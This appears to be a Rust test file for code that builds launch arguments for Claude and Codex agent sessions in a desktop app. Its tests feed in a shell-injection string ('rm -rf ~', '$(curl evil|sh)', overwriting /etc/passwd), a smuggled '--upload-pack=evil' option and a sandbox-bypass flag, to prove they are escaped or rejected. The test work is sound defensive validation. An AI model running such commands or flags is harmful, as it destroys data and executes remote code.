use super::*;

const NONCE: &str = "0123456789abcdef0123456789abcdef";
const SID: &str = "0f8fad5b-d9cb-469f-a165-70867728950e";
// 2026-11-05 12:30:59 UTC
const SHA: &str = "ea73cb05d639b945e21c667e17103e56404861a8";
const T: u64 = 1_793_881_859;

fn input() -> RunInput {
    RunInput {
        ask: "add a dark mode toggle".into(),
        max_rounds: 2,
        base: SHA.into(),
        max_in_flight: 4,
        campaign: None,
        provider: None,
    }
}

fn build(i: &RunInput) -> Result<Vec<String>, InvalidInput> {
    build_run_argv_at(i, NONCE, T, SID)
}

fn field(i: &RunInput) -> &'static str {
    build(i).unwrap_err().field
}

#[test]
fn build_run_argv_exact_shape() {
    let argv = build(&input()).unwrap();
    assert_eq!(argv.len(), 4);
    assert_eq!(argv[0], "claude");
    assert_eq!(argv[1], "--session-id");
    assert_eq!(argv[2], SID);
    assert_eq!(
        argv[3],
        "/vajra-deliver {\"ask\":\"add a dark mode toggle\",\"run_id\":\"20261105-1230\",\
         \"session_id\":\"0f8fad5b-d9cb-469f-a165-70867728950e\",\"max_rounds\":2,\
         \"base\":\"ea73cb05d639b945e21c667e17103e56404861a8\",\"maxInFlight\":4,\
         \"steer_nonce\":\"0123456789abcdef0123456789abcdef\"}"
    );
}

#[test]
fn build_run_argv_fresh_start_omits_campaign() {
    // Any `campaign` key is a resume to vajra-deliver.js; it must name a fresh run itself.
    assert!(!build(&input()).unwrap()[3].contains("campaign"));
}

#[test]
fn build_run_argv_explicit_campaign() {
    let mut i = input();
    i.campaign = Some("deliver-20261101-1200".into());
    let argv = build(&i).unwrap();
    assert!(argv[3].contains("\"campaign\":\"deliver-20261101-1200\""));
}

#[test]
fn build_run_argv_shell_metacharacters_stay_one_element() {
    let mut i = input();
    i.ask = "x; rm -rf ~ && $(curl evil|sh) `id` > /etc/passwd 'q' \"dq\" \\ \n next".into();
    let argv = build(&i).unwrap();
    assert_eq!(argv.len(), 4);
    assert!(argv[3].starts_with("/vajra-deliver {\"ask\":\"x; rm -rf ~ && $(curl evil|sh) `id`"));
    // Quotes, backslashes and newlines are JSON-escaped inside the one element.
    assert!(argv[3].contains("'q' \\\"dq\\\" \\\\ \\n next\""));
}

#[test]
fn build_run_argv_escapes_control_chars() {
    let mut i = input();
    i.ask = "a\u{1}b\tc\u{2028}".into();
    let argv = build(&i).unwrap();
    assert!(argv[3].contains("\"ask\":\"a\\u0001b\\tc\\u2028\""));
}

#[test]
fn build_run_argv_max_rounds_bounds() {
    for ok in 1..=3 {
        let mut i = input();
        i.max_rounds = ok;
        assert!(build(&i).is_ok());
    }
    for bad in [0, 4, 100] {
        let mut i = input();
        i.max_rounds = bad;
        assert_eq!(field(&i), "max_rounds");
    }
}

#[test]
fn build_run_argv_max_in_flight_bounds() {
    for ok in [1, 8, 16] {
        let mut i = input();
        i.max_in_flight = ok;
        let argv = build(&i).unwrap();
        assert!(argv[3].contains(&format!("\"maxInFlight\":{ok},")));
    }
    for bad in [0, 17] {
        let mut i = input();
        i.max_in_flight = bad;
        assert_eq!(field(&i), "maxInFlight");
    }
}

#[test]
fn build_run_argv_empty_ask_names_field() {
    for bad in ["", "   ", "\n\t"] {
        let mut i = input();
        i.ask = bad.into();
        assert_eq!(field(&i), "ask");
    }
    let mut i = input();
    i.ask = "a\0b".into();
    assert_eq!(field(&i), "ask");
    let mut i = input();
    i.ask = "a".repeat(MAX_ASK_BYTES + 1);
    assert_eq!(field(&i), "ask");
}

#[test]
fn build_run_argv_bad_base_names_field() {
    // validate() accepts refs for the form; the argv takes only what the workflow accepts.
    for bad in ["", "-x", "--upload-pack=evil", "a b", "a\nb", "a;b", "main", "origin/main", "abc123", "EA73CB0", &"a".repeat(41)] {
        let mut i = input();
        i.base = bad.into();
        assert_eq!(field(&i), "base", "base {bad:?}");
    }
    for ok in ["abcdef0", SHA] {
        let mut i = input();
        i.base = ok.into();
        assert!(build(&i).is_ok(), "base {ok:?}");
    }
}

#[test]
fn build_run_argv_bad_campaign_names_field() {
    for bad in ["", "../x", "a/b", "a b", ".hidden"] {
        let mut i = input();
        i.campaign = Some(bad.into());
        assert_eq!(field(&i), "campaign", "campaign {bad:?}");
    }
}

#[test]
fn build_run_argv_bad_nonce_names_field() {
    // vajra-deliver.js reads top-level `steer_nonce` and accepts only /^[0-9a-f]{32,128}$/.
    let upper = "0123456789ABCDEF0123456789ABCDEF".to_string();
    let long = "a".repeat(129);
    for bad in ["", "short", "has space nonce", "quote\"nonce1234", "n0nce-ABCDEFGH1234", &upper, &long, &"a".repeat(31)] {
        let err = build_run_argv_at(&input(), bad, T, SID).unwrap_err();
        assert_eq!(err.field, "steer_nonce", "nonce {bad:?}");
    }
}

#[test]
fn build_run_argv_error_message_names_field() {
    let mut i = input();
    i.max_rounds = 9;
    let msg = build(&i).unwrap_err().to_string();
    assert!(msg.starts_with("max_rounds:"), "{msg}");
}

#[test]
fn build_run_argv_public_fn_uses_fresh_uuid_and_now() {
    let a = build_run_argv(&input(), NONCE).unwrap();
    let b = build_run_argv(&input(), NONCE).unwrap();
    assert_ne!(a[2], b[2]);
    let sid = &a[2];
    assert_eq!(sid.len(), 36);
    assert!(sid.bytes().all(|c| c.is_ascii_hexdigit() || c == b'-'));
    assert_eq!(&sid[14..15], "4");
    assert!(matches!(&sid[19..20], "8" | "9" | "a" | "b"));
    assert!(a[3].contains(&format!("\"session_id\":\"{sid}\"")));
    // run_id: 13 chars, YYYYMMDD-HHMM.
    let at = a[3].find("\"run_id\":\"").unwrap() + 10;
    let rid = &a[3][at..at + 13];
    assert_eq!(&rid[8..9], "-");
    assert!(
        rid[..8]
            .bytes()
            .chain(rid[9..].bytes())
            .all(|c| c.is_ascii_digit())
    );
}

#[test]
fn resume_argv_carries_the_rotated_nonce_and_the_runs_own_id() {
    let a = build_resume_argv(SID, "20261105-1230", "deliver-20261105-1230", NONCE).unwrap();
    assert_eq!(
        a,
        [
            "claude",
            "--resume",
            SID,
            "/vajra-deliver {\"campaign\":\"deliver-20261105-1230\",\"run_id\":\"20261105-1230\",\"session_id\":\"0f8fad5b-d9cb-469f-a165-70867728950e\",\
             \"steer_nonce\":\"0123456789abcdef0123456789abcdef\"}"
        ]
    );
    assert_eq!(build_resume_argv(SID, "20261105-1230", "../x", NONCE).unwrap_err().field, "campaign");
    assert_eq!(build_resume_argv(SID, "20261105-1230", "deliver-1", "short").unwrap_err().field, "steer_nonce");
    assert_eq!(build_resume_argv("--last", "20261105-1230", "deliver-1", NONCE).unwrap_err().field, "session_id");
}

#[test]
fn contract_matches_vajra_deliver_js() {
    let js = std::fs::read_to_string(concat!(env!("CARGO_MANIFEST_DIR"), "/../../workflows/vajra-deliver.js")).unwrap();
    // base: the workflow accepts exactly 7 to 40 lowercase hex.
    assert!(js.contains("const SHA_RE = /^[0-9a-f]{7,40}$/"));
    // campaign: any value is a resume; a fresh run is named deliver-<run_id> by the workflow.
    assert!(js.contains("const RESUME = given(A.campaign)"));
    assert!(js.contains("const CAMPAIGN = RESUME || `deliver-${RUN}`"));
}

#[test]
fn resume_without_a_valid_run_id_is_refused_and_the_json_names_the_workflows_run() {
    for bad in ["", "d123abc", "2026-11-05", "20261105-12300", "../x"] {
        assert_eq!(build_resume_argv(SID, bad, "deliver-1", NONCE).unwrap_err().field, "run_id", "{bad:?}");
    }
    // vajra-deliver.js: `RUN = given(A.run_id) ? A.run_id : 'd' + fnv(...)`. A resume that omitted run_id would make
    // the workflow name tasks and branches after a hash of the campaign instead of the run the app tracks.
    let js = std::fs::read_to_string(concat!(env!("CARGO_MANIFEST_DIR"), "/../../workflows/vajra-deliver.js")).unwrap();
    assert!(js.contains("const RUN = given(A.run_id) ? A.run_id : 'd' + fnv(ASK || RESUME)"));
    let a = build_resume_argv(SID, "20261105-1230", "deliver-20261105-1230", NONCE).unwrap();
    let json: serde_json::Value = serde_json::from_str(a[3].strip_prefix("/vajra-deliver ").unwrap()).unwrap();
    assert_eq!(json["run_id"], "20261105-1230", "given(A.run_id) is true, so RUN is the app's run id");
    assert_eq!(json["campaign"], "deliver-20261105-1230");
}

// ------------------------------------------------------------ ADR-13 Lead argv

const CLAUDE: &str = "/Users/u/.nvm/versions/node/v22/bin/claude";
const LSETTINGS: &str = "/Users/u/Library/Application Support/VajraDesktop/lead/settings.json";
const LMCP: &str = "/Users/u/Library/Application Support/VajraDesktop/lead/mcp.json";

fn lead(resume: bool) -> Vec<String> {
    build_lead_argv(&LeadArgv {
        claude: Path::new(CLAUDE),
        lead_session_id: SID,
        resume,
        settings: Path::new(LSETTINGS),
        mcp_config: Path::new(LMCP),
    })
    .unwrap()
}

fn after<'a>(argv: &'a [String], flag: &str) -> &'a str {
    let i = argv.iter().position(|a| a == flag).unwrap_or_else(|| panic!("{flag} missing"));
    &argv[i + 1]
}

#[test]
fn lead_argv_is_fixed_template() {
    let want = [
        CLAUDE, "-p", "--session-id", SID, "--output-format", "stream-json", "--verbose",
        "--setting-sources", "", "--settings", LSETTINGS, "--permission-mode", "dontAsk",
        "--tools", LEAD_TOOLS, "--allowedTools", LEAD_TOOLS, "--mcp-config", LMCP, "--strict-mcp-config",
        "--agents", LEAD_AGENTS, "--agent", "vajra-lead",
    ];
    assert_eq!(lead(false), want);
    // A later ask resumes the same session; nothing else changes.
    let mut resumed = want.to_vec();
    resumed[2] = "--resume";
    assert_eq!(lead(true), resumed);

    for argv in [lead(false), lead(true)] {
        // No positional prompt: the last element belongs to a flag, and no element is a free-standing prompt.
        assert_eq!(argv.last().unwrap(), "vajra-lead");
        assert_eq!(argv[argv.len() - 2], "--agent");
        // The POS-2.4 test.
        for a in &argv {
            assert!(!a.contains("dangerously-skip-permissions") && !a.contains("bypassPermissions"), "{a}");
        }
        // --tools and --allowedTools are equal, exact, and one element each (both are variadic in the CLI).
        assert_eq!(after(&argv, "--tools"), after(&argv, "--allowedTools"));
        assert_eq!(
            after(&argv, "--tools"),
            "Read,Grep,Glob,mcp__vajra-desktop__list_workers,mcp__vajra-desktop__inspect_worker,\
             mcp__vajra-desktop__message_worker,mcp__vajra-desktop__redirect_worker,mcp__vajra-desktop__stop_worker,\
             mcp__vajra-desktop__propose_run"
        );
        assert_eq!(after(&argv, "--permission-mode"), "dontAsk");
        assert_eq!(after(&argv, "--setting-sources"), "");
        assert_eq!(after(&argv, "--mcp-config"), LMCP);
        assert!(Path::new(&argv[0]).is_absolute());
        // The element after every flag that takes a list is not another flag's value in disguise.
        for f in ["--tools", "--allowedTools", "--mcp-config"] {
            assert!(!after(&argv, f).starts_with('-'), "{f}");
        }
    }
}

#[test]
fn lead_argv_has_settings_after_sources() {
    for argv in [lead(false), lead(true)] {
        let src = argv.iter().position(|a| a == "--setting-sources").unwrap();
        let set = argv.iter().position(|a| a == "--settings").unwrap();
        assert_eq!(argv[src + 1], "");
        assert!(set > src, "--settings follows --setting-sources");
        assert_eq!(argv[set + 1], LSETTINGS);
        assert_eq!(argv.iter().filter(|a| *a == "--settings").count(), 1);
    }
}

#[test]
fn lead_argv_refuses_bad_inputs() {
    let ok = |claude: &str, sid: &str, s: &str, m: &str| {
        build_lead_argv(&LeadArgv { claude: Path::new(claude), lead_session_id: sid, resume: false, settings: Path::new(s), mcp_config: Path::new(m) })
    };
    assert!(ok(CLAUDE, SID, LSETTINGS, LMCP).is_ok());
    assert_eq!(ok("claude", SID, LSETTINGS, LMCP).unwrap_err().field, "claude");
    assert_eq!(ok(CLAUDE, "--last", LSETTINGS, LMCP).unwrap_err().field, "lead_session_id");
    assert_eq!(ok(CLAUDE, SID, "lead/settings.json", LMCP).unwrap_err().field, "settings");
    assert_eq!(ok(CLAUDE, SID, LSETTINGS, "mcp.json").unwrap_err().field, "mcp_config");
    assert_eq!(ok(CLAUDE, SID, LSETTINGS, "/a\0b").unwrap_err().field, "mcp_config");
}

#[test]
fn lead_agents_json_is_one_valid_agent() {
    let v: serde_json::Value = serde_json::from_str(LEAD_AGENTS).unwrap();
    let a = &v["vajra-lead"];
    assert!(a["description"].is_string() && a["prompt"].as_str().unwrap().len() > 100);
    assert_eq!(v.as_object().unwrap().len(), 1);
}

/// The bench rig's "lead" arm (app/bench/ade/anatomy_arms.json) measures the Director-General's first request. It must be
/// the production launch minus only what needs the app's own files: the settings file, the MCP config, and the six MCP
/// tools. So its prompt, agent, permission mode and built-in tool list are pinned to `build_lead_argv`, and a change to
/// `LEAD_AGENTS` fails here until the arms file follows.
#[test]
fn the_bench_rigs_lead_arm_is_the_production_launch_minus_the_apps_own_files() {
    let arms: serde_json::Value = serde_json::from_str(include_str!("../../../bench/ade/anatomy_arms.json")).unwrap();
    let arm: Vec<String> = arms["lead"].as_array().unwrap().iter().map(|x| x.as_str().unwrap().to_string()).collect();
    let prod = lead(false);
    for flag in ["--setting-sources", "--permission-mode", "--agents", "--agent"] {
        assert_eq!(after(&arm, flag), after(&prod, flag), "{flag}");
    }
    assert!(arm.iter().any(|a| a == "--strict-mcp-config"));
    let builtin: Vec<&str> = LEAD_TOOLS.split(',').filter(|t| !t.starts_with("mcp__")).collect();
    assert_eq!(after(&arm, "--tools"), builtin.join(","));
    // Nothing else sneaks in: these flags, and no more.
    let flags: std::collections::BTreeSet<&str> = arm.iter().filter(|a| a.starts_with("--")).map(String::as_str).collect();
    assert_eq!(
        flags.into_iter().collect::<Vec<_>>(),
        ["--agent", "--agents", "--permission-mode", "--setting-sources", "--strict-mcp-config", "--tools"]
    );
}

const KEY: &str = "SENTINEL-sk-or-v1-0123456789";

fn gateway(effort: Option<&str>) -> Vec<String> {
    build_gateway_argv("add a toggle", "deepseek/deepseek-v4-flash", effort).unwrap()
}

#[test]
fn gateway_argv_snapshot() {
    let a = gateway(Some("high"));
    assert_eq!(a[..4], ["/bin/sh", "-c", r#"exec "$@" </dev/null"#, "sh"]);
    assert_eq!(
        a[4..],
        [
            "codex", "exec", "--json", "--sandbox", "workspace-write", "-m", "deepseek/deepseek-v4-flash",
            "-c", "model_reasoning_effort=\"high\"",
            "-c", "model_providers.vajra-openrouter.request_max_retries=0",
            "-c", "model_providers.vajra-openrouter.stream_max_retries=0",
            "-c", "sandbox_workspace_write.exclude_slash_tmp=true",
            "-c", "sandbox_workspace_write.exclude_tmpdir_env_var=true",
            "--", "add a toggle",
        ]
    );
}

#[test]
fn gateway_argv_without_effort_has_no_effort_override_but_keeps_retry_and_sandbox() {
    let a = gateway(None);
    assert!(!a.iter().any(|x| x.contains("model_reasoning_effort")));
    for want in ["request_max_retries=0", "stream_max_retries=0", "exclude_slash_tmp=true", "exclude_tmpdir_env_var=true"] {
        assert!(a.iter().any(|x| x.ends_with(want)), "{want}");
    }
}

#[test]
fn gateway_argv_holds_no_key_and_keeps_the_ask_after_the_separator() {
    // The ask is the one free-text element and it is last, after `--`, so a flag-shaped ask stays a prompt.
    let a = build_gateway_argv("--dangerously-bypass-approvals-and-sandbox", "m", None).unwrap();
    assert_eq!(a[a.len() - 2..], ["--", "--dangerously-bypass-approvals-and-sandbox"]);
    assert!(!a.iter().any(|x| x.contains(KEY) || x.contains("API_KEY") || x.contains("Bearer")));}

#[test]
fn gateway_argv_refuses_bad_inputs() {
    let f = |ask: &str, m: &str, e: Option<&str>| build_gateway_argv(ask, m, e).unwrap_err().field;
    assert_eq!(f("", "m", None), "ask");
    assert_eq!(f("a\0b", "m", None), "ask");
    assert_eq!(f("x", "", None), "model");
    assert_eq!(f("x", "-m", None), "model");
    assert_eq!(f("x", "a b", None), "model");
    assert_eq!(f("x", "a;b", None), "model");
    assert_eq!(f("x", "m", Some("high\"\nx=1")), "effort");
    assert_eq!(f("x", "m", Some("max")), "effort");
}

#[test]
fn only_a_codex_gateway_or_key_account_gets_the_gateway_argv() {
    use crate::adapter::{gateway_run_argv, Account, Engine, Route};
    let acct = |engine, route| Account { id: "openrouter".into(), engine, route };
    for ok in [Route::Gateway, Route::ApiKey] {
        assert!(gateway_run_argv(&acct(Engine::Codex, ok), "x", "m", None).is_ok());
    }
    assert!(gateway_run_argv(&Account::login(Engine::Codex), "x", "m", None).is_err());
    assert!(gateway_run_argv(&acct(Engine::Claude, Route::Gateway), "x", "m", None).is_err());
}
